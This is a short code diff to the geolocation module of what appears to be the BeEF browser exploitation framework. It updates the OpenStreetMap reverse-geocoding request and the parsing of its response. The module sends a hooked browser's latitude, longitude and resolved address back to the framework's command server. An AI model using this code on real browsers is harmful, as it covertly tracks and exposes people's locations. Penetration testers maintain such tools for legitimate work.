@@ -40,16 +40,17 @@ beef.geolocation = {
                 },
             success: function(data, status, xhr){
                 beef.debug("[geolocation.js] openstreetmap success");
-                var jsonResp = $j.parseJSON(data);
+                //var jsonResp = $j.parseJSON(data);
 
                 beef.net.send(command_url, command_id, "latitude=" + latitude
                              + "&longitude=" + longitude
 //                             + "&osm=" + encodeURI(jsonResp.display_name)
-                              + "&osm=tofix"
+                              + "&osm=" + data.display_name
                              + "&geoLocEnabled=True");
                 },
             type: "get",
-            url: "http://nominatim.openstreetmap.org/reverse?format=json&lat=" +
+	    dataType: "json",
+            url: "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" +
                 latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
         });
 
